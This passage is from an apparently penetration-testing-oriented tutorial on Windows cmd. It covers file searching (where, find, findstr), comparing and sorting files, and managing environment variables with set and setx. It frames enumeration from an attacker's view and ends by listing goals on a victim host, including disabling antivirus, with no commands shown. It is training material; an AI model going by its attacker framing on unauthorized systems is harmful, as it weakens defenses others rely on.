<p>Above, we can see two different tries using the <code>where</code> command. First, we searched for <code>calc.exe</code>, and it completed showing us the path for calc.exe. This command worked because the system32 folder is in our environment variable path, so the <code>where</code> command can look through those folders automatically.</p>
<p>The second attempt we see failed. This is because we are searching for a file that does not exist within that environment path. It is located within our user directory. So we need to specify the path to search in, and to ensure we dig through all directories within that path, we can use the <code>/R</code> switch.</p>
<p><strong>Recursive Where</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>esktop&gt;where /R C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\ </span>bio.txt

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>ownloads<span class="hljs-symbol">\b</span>io.txt
</code></pre>
<p>Above, we searched recursively, looking for bio.txt. The file was found in the <code>C:\Users\student\Downloads\</code> folder. The <code>/R</code> switch forced the <code>where</code> command to search through every folder in the student user directory hive. On top of looking for files, we can also search wildcards for specific strings, file types, and more. Below is an example of searching for the <code>csv</code> file type within the student directory.</p>
<p><strong>Using Wildcards</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>esktop&gt;where /R C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\ </span>*.csv

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\l</span>ive-hosts.csv
</code></pre>
<p>We used <code>where</code> to give us an idea of how to search for files and applications on the host. Now, let us talk about <code>Find</code>. Find is used to search for text strings or their absence within a file or files. You can also use <code>find</code> against the console&#39;s output or another command. Where <code>find</code> is limited, however, is its capability to utilize wildcard patterns in its matching. The example below will show us a simple search with Find against the not-password.txt file.</p>
<p><strong>Basic Find</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>esktop&gt; find "password" "C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\n</span>ot-passwords.txt"
</code></pre>
<p>We can modify the way <code>find</code> searches using several switches. The <code>/V</code> modifier can change our search from a matching clause to a <code>Not</code> clause. So, for example, if we use <code>/V</code> with the search string password against a file, it will show us any line that does not have the specified string. We can also use the <code>/N</code> switch to display line numbers for us and the <code>/I</code> display to ignore case sensitivity. In the example below, we use all of the modifiers to show us any lines that do not match the string <code>IP Address</code> while asking it to display line numbers and ignore the case of the string.</p>
<p><strong>Find Modifiers</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\Users\student\Desktop&gt; find /<span class="hljs-keyword">N</span> /<span class="hljs-keyword">I</span> /V <span class="hljs-string">"IP Address"</span> example.txt
</code></pre>
<p>For quick searches, find is easy to use, but it could be more robust in how it can search. However, if we need something more specific, <code>findstr</code> is what we need. The <code>findstr</code> command is similar to <code>find</code> in that it searches through files but for patterns instead. It will look for anything matching a pattern, regex value, wildcards, and more. Think of it as find2.0. For those familiar with Linux, <code>findstr</code> is closer to <code>grep</code>.</p>
<p><strong>Findstr</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>esktop&gt; findstr
</code></pre>
<h4 id="evaluating-and-sorting-files">Evaluating and Sorting Files</h4>
<p>We have seen how to work with, search for certain files and search for strings inside files. Additionally, we have also learned how to create and modify files. Now let us discuss a few options to evaluate those files and compare them against each other. The <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/comp">comp</a>, <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fc">fc</a>, and <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sort">sort</a> commands are how we will accomplish this.</p>
<p><code>Comp</code> will check each byte within two files looking for differences and then displays where they start. By default, the differences are shown in a decimal format. We can use the <code>/A</code> modifier if we want to see the differences in ASCII format. The <code>/L</code> modifier can also provide us with the line numbers.</p>
<p><strong>Compare</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session">C:\Users\student\Desktop&gt; comp .\file-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span> .\file-<span class="hljs-number">2</span><span class="hljs-selector-class">.md</span>

Comparing .\file-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span> and .\file-<span class="hljs-number">2</span><span class="hljs-selector-class">.md</span>...
Files compare OK
</code></pre>
<p>Above, we see the comparison come back OK. The files are the same. We can use this as an easy way to check if any scripts, executables, or critical files have been modified. Below we have output from a file that&#39;s been changed.</p>
<p><strong>Comparing Different Files</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; echo <span class="hljs-selector-tag">a</span> &gt; .\file-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span>
PS C:\Users\MTanaka\Desktop&gt; echo <span class="hljs-selector-tag">a</span> &gt; .\file-<span class="hljs-number">2</span><span class="hljs-selector-class">.md</span>
PS C:\Users\MTanaka\Desktop&gt; comp .\file-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span> .\file-<span class="hljs-number">2</span><span class="hljs-selector-class">.md</span> /A
Comparing .\file-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span> and .\file-<span class="hljs-number">2</span><span class="hljs-selector-class">.md</span>...
Files compare OK
&lt;SNIP&gt;
PS C:\Users\MTanaka\Desktop&gt; echo <span class="hljs-selector-tag">b</span> &gt; .\file-<span class="hljs-number">2</span><span class="hljs-selector-class">.md</span>
PS C:\Users\MTanaka\Desktop&gt; comp .\file-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span> .\file-<span class="hljs-number">2</span><span class="hljs-selector-class">.md</span> /A
Comparing .\file-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span> and .\file-<span class="hljs-number">2</span><span class="hljs-selector-class">.md</span>...
Compare error at OFFSET <span class="hljs-number">2</span>
file1 = <span class="hljs-selector-tag">a</span>
file2 = b
</code></pre>
<p>We used echo to ensure the strings differed and then reran the comparison. Notice how our output changed, and using the /A modifier, we are seeing the character difference between the two files now. <code>Comp</code> is a simple but effective tool. Now let us look at <code>FC</code> for a minute. <code>FC</code> differs in that it will show you which lines are different, not just an individual character (<code>/A</code>) or byte that is different on each line. FC has quite a few more options than Comp has, so be sure to look at the help output to ensure you are using it in the manner you want.</p>
<p><strong>FC Help</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session">C:\htb&gt; fc.exe /?

Compares <span class="hljs-literal">two</span> <span class="hljs-built_in">files</span> <span class="hljs-keyword">or</span> sets <span class="hljs-keyword">of</span> <span class="hljs-built_in">files</span> <span class="hljs-keyword">and</span> displays <span class="hljs-keyword">the</span> differences between
them

FC [/A] [/C] [/L] [/LBn] [/N] [/OFF[LINE]] [/T] [/U] [/W] [/nnnn]
   [drive1:][path1]filename1 [drive2:][path2]filename2
FC /B [drive1:][path1]filename1 [drive2:][path2]filename2

  /A         Displays only <span class="hljs-keyword">first</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">last</span> <span class="hljs-keyword">lines</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-built_in">set</span> <span class="hljs-keyword">of</span> differences.
  /B         Performs <span class="hljs-keyword">a</span> binary comparison.
  /C         Disregards <span class="hljs-keyword">the</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">of</span> letters.
  /L         Compares <span class="hljs-built_in">files</span> <span class="hljs-keyword">as</span> ASCII <span class="hljs-keyword">text</span>.
  /LBn       Sets <span class="hljs-keyword">the</span> maximum consecutive mismatches <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> specified
             <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">lines</span>.
  /N         Displays <span class="hljs-keyword">the</span> <span class="hljs-built_in">line</span> numbers <span class="hljs-keyword">on</span> <span class="hljs-title">an</span> <span class="hljs-title">ASCII</span> <span class="hljs-title">comparison</span>.
  /OFF[LINE] Do <span class="hljs-keyword">not</span> skip <span class="hljs-built_in">files</span> <span class="hljs-keyword">with</span> offline attribute <span class="hljs-built_in">set</span>.
  /T         Does <span class="hljs-keyword">not</span> expand tabs <span class="hljs-built_in">to</span> spaces.
  /U         Compare <span class="hljs-built_in">files</span> <span class="hljs-keyword">as</span> UNICODE <span class="hljs-keyword">text</span> <span class="hljs-built_in">files</span>.
  /W         Compresses white <span class="hljs-literal">space</span> (tabs <span class="hljs-keyword">and</span> spaces) <span class="hljs-keyword">for</span> comparison.
  /nnnn      Specifies <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> consecutive <span class="hljs-keyword">lines</span> that must match
             <span class="hljs-keyword">after</span> <span class="hljs-keyword">a</span> mismatch.
  [drive1:][path1]filename1
             Specifies <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">set</span> <span class="hljs-keyword">of</span> <span class="hljs-built_in">files</span> <span class="hljs-built_in">to</span> compare.
  [drive2:][path2]filename2
             Specifies <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">set</span> <span class="hljs-keyword">of</span> <span class="hljs-built_in">files</span> <span class="hljs-built_in">to</span> compare.
</code></pre>
<p>When FC performs its inspection, it is case-sensitive and cares more than just a byte-for-byte comparison. Below we will use a few files with many more characters and strings to test its functionality. We will perform a basic check and have it print the line numbers and the ASCII comparison using the <code>/N</code> modifier.</p>
<p><strong>FC</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session">C:\Users\student\Desktop&gt; fc passwords.txt modded.txt /N

Comparing files passwords.txt and MODDED.TXT
<span class="hljs-bullet">***** </span>passwords.txt
<span class="hljs-code">    1:  123456</span>
<span class="hljs-code">    2:  password</span>
<span class="hljs-bullet">***** </span>MODDED.TXT
<span class="hljs-code">    1:  123456</span>
<span class="hljs-code">    2:</span>
<span class="hljs-code">    3:  password</span>
*****

***** passwords.txt
    5:  12345
    6:  qwerty
***** MODDED.TXT
    6:  12345
    7:  Just something extra to show functionality. Did it see the space inserted above?
    8:  qwerty
*****
</code></pre>
<p>The output from FC is much easier to interpret and gives us a bit more clarity about the differences between the files. When comparing files such as text files, spreadsheets, or lists, it is prudent to sort them first to ensure the data on each string is the same. Otherwise, every line will be different, and our comparison will not help. Let us look at <code>sort</code> now to help us with that. With <code>Sort</code>, we can receive input from the console, pipeline, or a file, sort it and send the results to the console or into a file or another command. It is relatively simple to use and often will be used in conjunction with pipeline operators such as <code>|</code>, <code>&lt;</code>, and <code>&gt;</code>. We can give it a try now by feeding the contents of the <code>file</code> file to sort.</p>
<p><strong>Sort</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session">C:\Users\student\Desktop&gt; type .\file-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span>
<span class="hljs-selector-tag">a</span>
<span class="hljs-selector-tag">b</span>
d
h
w
<span class="hljs-selector-tag">a</span>
<span class="hljs-selector-tag">q</span>
h
g

C:\Users\MTanaka\Desktop&gt; sort<span class="hljs-selector-class">.exe</span> .\file-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span> /O .\sort-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span>
C:\Users\MTanaka\Desktop&gt; type .\sort-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span>

<span class="hljs-selector-tag">a</span>
<span class="hljs-selector-tag">a</span>
<span class="hljs-selector-tag">b</span>
d
g
h
h
<span class="hljs-selector-tag">q</span>
w
</code></pre>
<p>Above, we can see using <code>sort</code> on the file <code>file-1.md</code> and then sending the result with the <code>/O</code> modifier to the file sort-1.md, we took our list of letters, sorted them in alphabetical order, and wrote them to the new file. It can get more complex when working with larger datasets, but the basic usage is still the same. If we wanted <code>sort</code> only to return unique entries, we could also use the /unique modifier. Notice the first two entries in the <code>sort-1.md</code> file . Let us try using unique and see what happens.</p>
<p><strong>unique</strong></p>
<p>Finding Files and Directories</p>
<pre><code class="lang-cmd-session">C:\htb&gt; type .\sort-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span>

<span class="hljs-selector-tag">a</span>
<span class="hljs-selector-tag">a</span>
<span class="hljs-selector-tag">b</span>
d
g
h
h
<span class="hljs-selector-tag">q</span>
w

PS C:\Users\MTanaka\Desktop&gt; sort<span class="hljs-selector-class">.exe</span> .\sort-<span class="hljs-number">1</span><span class="hljs-selector-class">.md</span> /unique

<span class="hljs-selector-tag">a</span>
<span class="hljs-selector-tag">b</span>
d
g
h
<span class="hljs-selector-tag">q</span>
w
</code></pre>
<p>Notice how we have fewer overall results now. This is because <code>sort</code> did not write duplicate entries from the file to the console.</p>
<hr>
<p>Finding files and directories, sorting datasets, and comparing files are all essential skills we should have in our arsenal. Next, we will discuss Environment variables and what they provide us as a cmd-prompt user.</p>
<h2 id="environment-variables">Environment Variables</h2>
<hr>
<p>Now that we have our feet under us when it comes to using the Command Prompt let us discuss one of the more critical topics when thinking about how applications and scripting work in Windows, <code>Environment Variables</code>. In this section, we will discuss what they are, their uses, and how we can manage the variables in our system.</p>
<hr>
<h3 id="what-an-environment-variable-is">What an Environment Variable Is</h3>
<p>Environment variables are settings that are often applied globally to our hosts. They can be found on Windows, Linux, and macOS hosts. This concept is not specific to one OS type, but they function differently on each OS. Environment variables can be accessed by most users and applications on the host and are used to run scripts and speed up how applications function and reference data. On a Windows host, environment variables are <code>not</code> case sensitive and can have spaces and numbers in the name. The only real catch we will find is that they cannot have a name that starts with a number or include an equal sign. When referenced, we will see these variables called like so:</p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session"><span class="hljs-tag">%<span class="hljs-selector-tag">SUPER_IMPORTANT_VARIABLE</span></span>%
</code></pre>
<p>It is normal to see these variables (especially those already built into the system) displayed in uppercase letters and utilizing an underscore to link any words in the name. Before moving on, we should mention one crucial concept regarding environment variables known as <code>Scope</code>.</p>
<p><strong>Variable Scope</strong></p>
<p>In this context, <code>Scope</code> is a programming concept that refers to where variables can be accessed or referenced. &#39;Scope&#39; can be broadly separated into two categories:</p>
<ul>
<li><strong>Global:</strong><ul>
<li>Global variables are accessible <code>globally</code>. In this context, the global scope lets us know that we can access and reference the data stored inside the variable from anywhere within a program.</li>
</ul>
</li>
<li><strong>Local:</strong><ul>
<li>Local variables are only accessible within a <code>local</code> context. <code>Local</code> means that the data stored within these variables can only be accessed and referenced within the function or context in which it has been declared.</li>
</ul>
</li>
</ul>
<p>Let us walk through an example scenario together to understand the differences better. In this scenario, we have two users, <code>Alice</code> and <code>Bob</code>. Both users have a default command prompt session and are logged in concurrently to the same machine. Additionally, both users issue a command to print out the data stored within the <code>%WINDIR%</code> variable, as seen in the examples below.</p>
<p><strong>Showcasing Global Variables</strong></p>
<p><strong>Example 1:</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\a</span>lice&gt; echo <span class="hljs-variable">%WINDIR%</span>

C:<span class="hljs-symbol">\W</span>indows
</code></pre>
<p><strong>Example 2:</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob&gt; echo <span class="hljs-variable">%WINDIR%</span>

C:<span class="hljs-symbol">\W</span>indows
</code></pre>
<p>We can see that this variable is accessible to both users. As such, both users can display the data stored within it. This is because the <code>%WINDIR%</code> variable is a <code>global variable</code> as defined by the Windows OS. However, what if Alice wanted to create a secret variable that Bob could not view or access; how would she go about doing so?</p>
<p><strong>Showcasing Local Variables</strong></p>
<p><strong>Example 1:</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\a</span>lice&gt; set SECRET=HTB{5UP3r_53Cr37_V4r14813}

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\a</span>lice&gt; echo <span class="hljs-variable">%SECRET%</span>
HTB{5UP3r_53Cr37_V4r14813}
</code></pre>
<p><strong>Example 2:</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob&gt; echo <span class="hljs-variable">%SECRET%</span>
<span class="hljs-variable">%SECRET%</span>

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob&gt; set <span class="hljs-variable">%SECRET%</span>
Environment variable <span class="hljs-variable">%SECRET%</span> not defined
</code></pre>
<p>In the first example, Alice creates a variable called <code>SECRET</code> and stores the value <code>HTB{5UP3r_53Cr37_V4r14813}</code> inside it. After setting the value of the variable, Alice then retrieves it using the command <code>echo</code> to print out the value stored within. However, when Bob attempts to retrieve the same variable, he cannot, as it is not defined in his current environment. What Alice created was a <code>local variable</code> that only she could access as it was only defined in the context of her local environment.</p>
<p>Note: This explanation of global vs. local scope is in no way a fully comprehensive guide to the differences between them and will not include more advanced concepts. This section is to provide the necessary background information moving forward.</p>
<p>Now that we have a basic understanding of variables and a general idea of the basics behind defined <code>scopes</code>, let us dig into how Windows interacts and stores environment variables and how we can interact with them. Like before, Windows, like any other program, contains its own set of variables known as <code>Environment Variables</code>. These variables can be separated into their defined scopes known as <code>System</code> and <code>User</code> scopes. Additionally, there is one more defined scope known as the <code>Process</code> scope; however, it is volatile by nature and is considered to be a sub-scope of both the <code>System</code> and <code>User</code> scopes. Keeping this in mind, let&#39;s explore their differences and intended functionalities.</p>
<table>
<thead>
<tr>
<th>Scope</th>
<th>Description</th>
<th>Permissions Required to Access</th>
<th>Registry Location</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>System (Machine)</code></td>
<td>The System scope contains environment variables defined by the Operating System (OS) and are accessible globally by all users and accounts that log on to the system. The OS requires these variables to function properly and are loaded upon runtime.</td>
<td>Local Administrator or Domain Administrator</td>
<td><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment</code></td>
</tr>
<tr>
<td><code>User</code></td>
<td>The User scope contains environment variables defined by the currently active user and are only accessible to them, not other users who can log on to the same system.</td>
<td>Current Active User, Local Administrator, or Domain Administrator</td>
<td><code>HKEY_CURRENT_USER\Environment</code></td>
</tr>
<tr>
<td><code>Process</code></td>
<td>The Process scope contains environment variables that are defined and accessible in the context of the currently running process. Due to their transient nature, their lifetime only lasts for the currently running process in which they were initially defined. They also inherit variables from the System/User Scopes and the parent process that spawns it (only if it is a child process).</td>
<td>Current Child Process, Parent Process, or Current Active User</td>
<td><code>None (Stored in Process Memory)</code></td>
</tr>
</tbody>
</table>
<p>The table should provide good overall coverage of how Windows deals with environment variables and how only certain users can access certain variables due to permissions. Now that we understand these differences, let us begin attempting to make specific changes to environment variables ourselves.</p>
<hr>
<h3 id="using-set-and-echo-to-view-variables">Using Set and Echo to View Variables</h3>
<p>To understand the changes to environment variables taking place, we need some way to view their contents via the command prompt. Thankfully, we have a couple of choices available to us: <code>set</code> and <code>echo</code>.</p>
<p><strong>Display with Set</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop&gt;set <span class="hljs-variable">%SYSTEMROOT%</span>

Environment variable C:<span class="hljs-symbol">\W</span>indows not defined
</code></pre>
<p>Upon opening the command prompt, you can issue the command <code>set</code> to print all available environment variables on the system. Alternatively, you can enter the same command again with the variable&#39;s name without setting it equal to anything to print the value of a specific variable. We see that in this case, it mentions the value itself is not defined; however, this is because we are not defining the value of <code>%SYSTEMROOT%</code> using <code>set</code> in this example.</p>
<p><strong>Display with Echo</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\&gt;</span>echo <span class="hljs-variable">%PATH%</span>

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop
</code></pre>
<p>Similar to the example above, you can use <code>echo</code> to display the value of an environment variable. Unlike the previous command, <code>echo</code> is used to print the value contained within the variable and has no additional built-in features to edit environment variables. In the next section, we will discuss how we create new variables, remove unneeded ones, and edit existing ones using the command prompt.</p>
<hr>
<h3 id="managing-environment-variables">Managing Environment Variables</h3>
<p>Now that we have some way to view existing environment variables on our system, we need to be able to create, remove, and manage them from the comfort and safety of our prompt. We have two methods available to us to do so. We can either use <code>set</code> or <code>setx</code> to perform our intended actions.</p>
<p><strong>When to Use <code>set</code> Vs. <code>setx</code></strong></p>
<p>Both <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/set\_1">set</a> and <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setx">setx</a> are command line utilities that allow us to display, set, and remove environment variables. The difference lies in how they achieve those goals. The <code>set</code> utility only manipulates environment variables in the current command line session. This means that once we close our current session, any additions, removals, or changes will not be reflected the next time we open a command prompt. Suppose we need to make permanent changes to environment variables. In that case, we can use <code>setx</code> to make the appropriate changes to the registry, which will exist upon restart of our current command prompt session.</p>
<p>Note: Using <code>setx</code>, we also have some additional functionality added in, such as being able to create and tweak variables across computers in the domain as well as our local machine.</p>
<p>We should now be familiar with some of the primary differences between both commands discussed above. There will be times and situations when one should be prioritized over the other. As an attacker, there will be times when we will need to enumerate existing environment variables for information. Let us move on and create some actual variables we can use.</p>
<p><strong>Creating Variables</strong></p>
<p>Creating environment variables is quite a simple task. We can use either <code>set</code> or <code>setx</code> depending on the task at hand and our overall goal. The following examples will show both being put into action to give us a feel for the syntax surrounding either command. Please note that the syntax between both in some cases is very similar; however, <code>setx</code> does have some additional features that we will attempt to explore here. Additionally, to ensure things are not getting too repetitive, we will only show both the <code>set</code> and <code>setx</code> commands for creating variables and utilizing <code>setx</code> for every other example. Just know that the syntax between creating, removing, and editing environment variables is identical.</p>
<p>Let us go ahead and create a variable to hold the value of the IP address of the Domain Controller (<code>DC</code>) since we might find it useful for testing connectivity to the domain or querying for updates. We can do this using the <code>set</code> command.</p>
<p><strong>Using set</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\htb&gt; <span class="hljs-keyword">set</span> DCIP=<span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.2</span>
</code></pre>
<p>Upon running this command, there is no immediate output. However, know that the variable has been set for our current command prompt session. We can verify this by printing out its value using <code>echo</code>.</p>
<p><strong>Validating the Change</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">echo</span> %<span class="hljs-selector-tag">DCIP</span>%

172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.2</span>
</code></pre>
<p>As we can see, the environment variable <code>%DCIP%</code> is now set and available for us to access. As stated above, this change is considered part of the <code>process</code> scope, as whenever we exit the command prompt and start a new session, this variable will cease to exist on the system. We can remedy this situation by permanently setting this variable in the environment using <code>setx</code>.</p>
<p><strong>Using setx</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session">C:\htb&gt; setx DCIP 172.16.5.2

<span class="hljs-keyword">SUCCESS: </span>Specified value was saved.
</code></pre>
<p>From this example, we can see that the syntax between commands varies slightly. Previously, we had to set the variable&#39;s value equal to the variable itself. Here we have to provide the variable&#39;s name followed by the value. The syntax is as follows: <code>setx &lt;variable name&gt; &lt;value&gt; &lt;parameters&gt;</code>. After running this command, we see that our value was saved in the registry since we were provided with the <code>SUCCESS</code> message. Of course, if we are curious if the value is truly set, we can validate it exactly as done above. Remember that this change will only occur after we open up another command prompt session. On a remote system, variables created or modified by this tool will be available at the next logon session.</p>
<p><strong>Editing Variables</strong></p>
<p>In addition to creating our own variables, we can edit existing ones. Since we are already familiar with creating them, editing is just as easy, except we will replace the existing values. Let us say that the IP address of our <code>DC</code> changed, and we need to update the value of our custom environment variable to reflect this change.</p>
<p><strong>Using setx</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session">C:\htb&gt; setx DCIP 172.16.5.5

<span class="hljs-keyword">SUCCESS: </span>Specified value was saved.
</code></pre>
<p>In the previous example, we set <code>172.16.5.2</code> as the value for the DC on the network; however, using <code>set</code>, we can update this value by simply setting the value again to our new address, <code>172.16.5.5</code>.</p>
<p><strong>Validating the edit</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">echo</span> %<span class="hljs-selector-tag">DCIP</span>%

172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.5</span>
</code></pre>
<p>We have successfully edited our initial custom variable to reflect the DC&#39;s IP change. We can now move on and discuss removing variables.</p>
<p><strong>Removing Variables</strong></p>
<p>Much like creating and editing variables, we can also remove environment variables in a very similar manner. To remove variables, we cannot directly delete them like we would a file or directory; instead, we must clear their values by setting them equal to nothing. This action will effectively delete the variable and prevent it from being used as intended due to the value being removed. In our first example, we created the variable <code>%DCIP%</code> containing the value of the IP address of the domain controller on the network and permanently saved it into the registry. We can attempt to remove it by doing the following:</p>
<p><strong>Using setx</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session">C:\htb&gt; setx DCIP ""


<span class="hljs-keyword">SUCCESS: </span>Specified value was saved.
</code></pre>
<p>This command will remove <code>%DCIP%</code> from our system&#39;s current environment variables and will also be reflected in the registry once we open a new command prompt session. We can verify that this is indeed the case by doing the following:</p>
<p><strong>Verifying the Variable has Been Removed</strong></p>
<p>Environment Variables</p>
<pre><code class="lang-cmd-session">C:\htb&gt; set DCIP
Environment variable DCIP <span class="hljs-keyword">not</span> <span class="hljs-keyword">defined</span>

C:\htb&gt; echo %DCIP%
%DCIP%
</code></pre>
<p>Using both <code>set</code> and <code>echo</code>, we can verify that the <code>%DCIP%</code> variable is no longer set and is not defined in our environment anymore.</p>
<hr>
<h3 id="important-environment-variables">Important Environment Variables</h3>
<p>Now that we are comfortable creating, editing, and removing our own environment variables, let us discuss some crucial variables we should be aware of when performing enumeration on a host&#39;s environment. Remember that all information found here is provided to us in clear text due to the nature of environment variables. As an attacker, this can provide us with a wealth of information about the current system and the user account accessing it.</p>
<table><thead><tr><th width="276">Variable Name</th><th>Description</th></tr></thead><tbody><tr><td><code>%PATH%</code></td><td>Specifies a set of directories(locations) where executable programs are located.</td></tr><tr><td><code>%OS%</code></td><td>The current operating system on the user&#39;s workstation.</td></tr><tr><td><code>%SYSTEMROOT%</code></td><td>Expands to <code>C:\Windows</code>. A system-defined read-only variable containing the Windows system folder. Anything Windows considers important to its core functionality is found here, including important data, core system binaries, and configuration files.</td></tr><tr><td><code>%LOGONSERVER%</code></td><td>Provides us with the login server for the currently active user followed by the machine&#39;s hostname. We can use this information to know if a machine is joined to a domain or workgroup.</td></tr><tr><td><code>%USERPROFILE%</code></td><td>Provides us with the location of the currently active user&#39;s home directory. Expands to <code>C:\Users{username}</code>.</td></tr><tr><td><code>%ProgramFiles%</code></td><td>Equivalent of <code>C:\Program Files</code>. This location is where all the programs are installed on an <code>x64</code> based system.</td></tr><tr><td><code>%ProgramFiles(x86)%</code></td><td>Equivalent of <code>C:\Program Files (x86)</code>. This location is where all 32-bit programs running under <code>WOW64</code> are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (<code>x86</code> vs. <code>x64</code> architecture)</td></tr></tbody></table>

<p>Provided here is only a tiny fraction of the information we can learn through enumerating the environment variables on a system. However, the abovementioned ones will often appear when performing enumeration on an engagement. For a complete list, we can visit the following <a href="https://ss64.com/nt/syntax-variables.html">link</a>. Using this information as a guide, we can start gathering any required information from these variables to help us learn about our host and its target environment inside and out.</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>Following the end of this section, we should have a comfortable grasp of what environment variables are and how we can manage them in a system. Environment variables are a part of the core functionality of the Windows OS and are considered very useful to both attackers and defenders. Any modifications that can affect system-wide variables should be handled with extreme caution. If we find it necessary for our scripts or tools, make a new variable before editing one already on the system. Now that we have that information out of the way let us move on to using the command line to work with services on our host.</p>
<h2 id="managing-services">Managing Services</h2>
<hr>
<p>Monitoring and controlling services on a host is integral to being an administrator. As an attacker, the ability to interrogate services, find solid points to hook into, and turn services on or off is a sought-after ability when landing on a host. In this section, we will look at the usage of <code>sc</code>, the Windows command line service controller utility, but we will go about it a little differently. Let&#39;s look at this from the perspective of an attacker. We have just landed on a victims host and need to:</p>
<ul>
<li>Determine what services are running.</li>
<li>Attempt to disable antivirus.</li>
<li>Modify existing services on a system.</li>
</ul>
<hr>
<h3 id="service-controller">Service Controller</h3>
